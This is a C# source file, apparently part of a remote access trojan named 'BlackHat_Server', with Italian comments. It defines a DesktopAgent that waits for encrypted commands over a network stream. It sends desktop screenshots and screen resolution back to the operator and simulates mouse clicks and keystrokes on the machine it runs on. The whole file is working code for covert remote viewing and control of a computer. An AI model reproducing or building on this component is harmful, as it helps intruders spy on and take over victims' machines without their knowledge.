using System;
using System.Collections.Generic;
using System.Text;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Drawing;

namespace BlackHat_Server
{
    class DesktopAgent
    {
        NetworkStream desktopNetwork;
        Size s = SystemInformation.PrimaryMonitorSize;

        MsgFileManager mfm;
        MsgManager mm;
        

        public DesktopAgent(NetworkStream ctor_Stream)
        {
            desktopNetwork = ctor_Stream;
            mfm = new MsgFileManager(desktopNetwork);
            mm = new MsgManager(desktopNetwork);
        }

        public void StartDesktopListener()
        {
            System.Threading.Thread t = new System.Threading.Thread(RemoteDesktopListener);
            t.IsBackground = true;
            t.Start();
        }

        private void RemoteDesktopListener()
        {
            //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
            //MsgManager mm = new MsgManager(desktopNetwork);

            VirtualMouse vm = new VirtualMouse();

            while (ST_Client.Instance.isConnected)
            {
                System.Threading.Thread.Sleep(10);

                string cmd = mm.WaitForEncryMessageRicorsive(10000);

                if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                {
                    string[] cmdSplit = cmd.Split('|');

                    //SCREEN RES INFO
                    if (cmdSplit[0] == "RESOLUTION")
                    {                        
                        string msg = string.Format("{0}|{1}",s.Width,s.Height);

                        mm.SendEncryMessage(msg,10000);
                    }

                    //MOUSE CONTROL
                    if (cmdSplit[0] == "MOUSE")
                    {
                        int t = int.Parse(cmdSplit[1]); // click singolo o doppio
                        int w = int.Parse(cmdSplit[2]);
                        int h = int.Parse(cmdSplit[3]);

                        if (t == 1)
                            vm.MouseClick(w, h);

                        if (t == 2)
                            vm.MouseDoubleCkick(w, h);
                        // -1 == CLICK DESTRO
                        if (t == -1)
                            vm.MouseRightClick(w, h);
                       
                    }

                    //MOUSE CONTROL
                    if (cmdSplit[0] == "KEYBOARD")
                    {
                        try
                        {
                            SendKeys.SendWait(@cmdSplit[1]);                          
                        }
                        catch {}
                        
                    }

                    // cmd3 = quality cmd1 = width cmd2 = heigh
                    if (cmdSplit[0] == "GET")
                    {
                        int w = int.Parse(cmdSplit[1]);
                        int h = int.Parse(cmdSplit[2]);
                        int q = int.Parse(cmdSplit[3]);

                        SendDesktop(w, h, q);
                    }

                    // MESSAGGIO DI CHIUSURA REMOTE DESKTOP
                    if (cmdSplit[0] == "EXIT_DESKTOP")
                        break;
                }
            }

            desktopNetwork.Close();

            // RIMUOVO DA LISTA
            if (ST_Client.Instance.nsListaCanali.Contains(desktopNetwork))
                ST_Client.Instance.nsListaCanali.Remove(desktopNetwork);
        }




        /// <summary>
        /// Manda Desktop Preview
        /// </summary>
        private void SendDesktop(int _width, int _height, int _quality)
        {
            //MsgFileManager mfm = new MsgFileManager(desktopNetwork);
            //MsgManager mm = new MsgManager(desktopNetwork);

            ImageWorker iw = new ImageWorker();
            byte[] dsk =  iw.DesktopImage(_width, _height, _quality);            

            if (dsk != null)
                mfm.SendEncryFileByte(dsk, 10000); // invio il desktop preview            
        }

    }
}
